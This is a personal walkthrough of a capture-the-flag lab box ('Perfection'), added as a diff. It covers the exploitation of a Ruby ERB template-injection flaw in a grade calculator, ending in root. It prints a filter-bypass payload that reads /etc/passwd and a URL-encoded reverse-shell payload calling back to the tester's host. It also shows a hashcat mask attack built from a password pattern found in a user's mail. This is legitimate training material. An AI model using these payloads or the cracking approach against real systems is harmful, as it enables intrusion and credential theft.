@@ -1,0 +1,68 @@
+Box name - Perfection
+Box "Difficulty" - Easy
+Starting 03/06/2024 
+Finished 03/06/2024
+
+
+22 and 80 open as far as ports go. 
+
+perfection.htb added to /etc/hosts
+
+http-title Weighted Grade Calculator.
+
+Homepage - Powered by WEBrick 1.7.0
+
+There is an area where you submit some values. It seems like they're doing some sort of parsing to tell whether or not a payload is malicious there. 
+
+Using SecLists I just threw a boatload of items at it to see if there was something that "wasn't filtered" 
+
+Now I'm going to repeater to see if I can && a ping to see if it'll talk back to my vm. 
+
+Run sudo tcpdump -i tun0 icmp to see ping responses. 
+
+ping 10.10.XXX.XXX -t 5
+
+Those were blocked. 
+
+Gotta be injection somehow though. Keep tryin'
+
+So one thing I neglected to note alongside the WeBrick/1.7.0 they're using Ruby/3.0.2/2021-07-07
+
+Found some stuff to inject with. 
+sdf%0a<%25=File.read("/etc/passwd")%25>
+
+sdf%0a<%25=%20system("bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.XXX.XXX%2F4444%200%3E%261%27")%20%25> - Winner
+
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX - User
+
+cat /var/mail/susan
+	Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
+
+	in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
+
+	{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+	Note that all letters of the first name should be convered into lowercase.
+
+	Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+hashcat -m 1400 hash.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
+	Susan-Miller-abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+	susan_nasus_XXXXXXXXX 
+
+sudo su
+	XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX - Root
+
+
+Finishing Notes - 
+
+Box wasn't too hard. Very easy to recognize the vulnerability. Execution was a little bit of a pain at first because I couldn't figure out the regex. Looking around
+online there was some stuff that helped. That's where I landed on the sdf. The sugested https://github.com/attackercan/regexp-security-cheatsheet Mine kept getting 
+hung up on the special characters. After url encoding them, it finally connected. 
+
+After getting the hash for susan it was more of waiting game for hashcat to do it's job. 
+
+All in all an easy box. Not sure if I'd call it "fun." I've been finding myself more frustrated when I know I'm super close.. and I'm off by a hair. 
+ 
+
+
